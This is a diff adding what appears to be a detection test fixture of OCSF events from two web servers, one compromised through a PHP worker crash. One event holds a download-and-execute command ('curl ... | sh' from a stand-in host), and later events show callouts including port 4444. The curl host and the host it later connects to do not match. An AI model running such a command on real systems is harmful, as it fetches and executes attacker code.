@@ -1,0 +1,70 @@
+// OCSF 1.9 events of two web servers. Only web-01 is compromised.
+{
+  time: 2026-07-01T10:00:00Z,
+  metadata: {version: "1.9.0", uid: "web-01-1"},
+  class_uid: 0, category_uid: 0, activity_id: 0, type_uid: 0,
+  device: {hostname: "web-01", os: {type_id: 200, name: "Linux"}},
+  // A crafted multipart request crashes a PHP worker.
+  message: "kernel: php-fpm8.3[4242]: segfault at 0 ip 00007f3a9c2b1e40 sp 00007ffd4f0e2a18 error 4 in libphp.so",
+}
+{
+  time: 2026-07-01T10:00:30Z,
+  metadata: {version: "1.9.0", uid: "web-02-1"},
+  class_uid: 0, category_uid: 0, activity_id: 0, type_uid: 0,
+  device: {hostname: "web-02", os: {type_id: 200, name: "Linux"}},
+  // The same crash on web-02.
+  message: "kernel: php-fpm8.3[1717]: segfault at 0 ip 00007f3a9c2b1e40 sp 00007ffd4f0e2a18 error 4 in libphp.so",
+}
+{
+  time: 2026-07-01T10:02:00Z,
+  metadata: {version: "1.9.0", uid: "web-01-2"},
+  class_uid: 1007, category_uid: 1, activity_id: 1, type_uid: 100701,
+  device: {hostname: "web-01", os: {type_id: 200, name: "Linux"}},
+  // The exploited worker spawns a shell.
+  process: {
+    uid: "web-01:5001",
+    file: {path: "/bin/sh", name: "sh"},
+    cmd_line: "sh -c curl -fsSL http://203.0.113.7/a.sh | sh",
+    parent_process: {uid: "web-01:4242", file: {path: "/usr/sbin/php-fpm8.3", name: "php-fpm8.3"}},
+  },
+}
+{
+  time: 2026-07-01T10:02:10Z,
+  metadata: {version: "1.9.0", uid: "web-02-2"},
+  class_uid: 1007, category_uid: 1, activity_id: 1, type_uid: 100701,
+  device: {hostname: "web-02", os: {type_id: 200, name: "Linux"}},
+  // A PHP worker on web-02 spawns a shell, too.
+  process: {
+    uid: "web-02:6001",
+    file: {path: "/bin/sh", name: "sh"},
+    cmd_line: "sh -c convert /tmp/upload.png /tmp/thumb.png",
+    parent_process: {uid: "web-02:1717", file: {path: "/usr/sbin/php-fpm8.3", name: "php-fpm8.3"}},
+  },
+}
+{
+  time: 2026-07-01T10:02:20Z,
+  metadata: {version: "1.9.0", uid: "web-02-3"},
+  class_uid: 4001, category_uid: 4, activity_id: 1, type_uid: 400101,
+  device: {hostname: "web-02", os: {type_id: 200, name: "Linux"}},
+  // An unrelated package update on web-02 calls out.
+  actor: {process: {uid: "web-02:7001", name: "apt", parent_process: {uid: "web-02:1"}}},
+  dst_endpoint: {ip: 151.101.2.132, port: 443},
+}
+{
+  time: 2026-07-01T10:02:30Z,
+  metadata: {version: "1.9.0", uid: "web-01-3"},
+  class_uid: 4001, category_uid: 4, activity_id: 1, type_uid: 400101,
+  device: {hostname: "web-01", os: {type_id: 200, name: "Linux"}},
+  // The shell's curl child fetches the second stage.
+  actor: {process: {uid: "web-01:5002", name: "curl", parent_process: {uid: "web-01:5001"}}},
+  dst_endpoint: {ip: 45.77.10.20, port: 80},
+}
+{
+  time: 2026-07-01T10:03:00Z,
+  metadata: {version: "1.9.0", uid: "web-01-4"},
+  class_uid: 4001, category_uid: 4, activity_id: 1, type_uid: 400101,
+  device: {hostname: "web-01", os: {type_id: 200, name: "Linux"}},
+  // A second callout of the same chain produces no further finding.
+  actor: {process: {uid: "web-01:5001", name: "sh", parent_process: {uid: "web-01:4242"}}},
+  dst_endpoint: {ip: 45.77.10.20, port: 4444},
+}
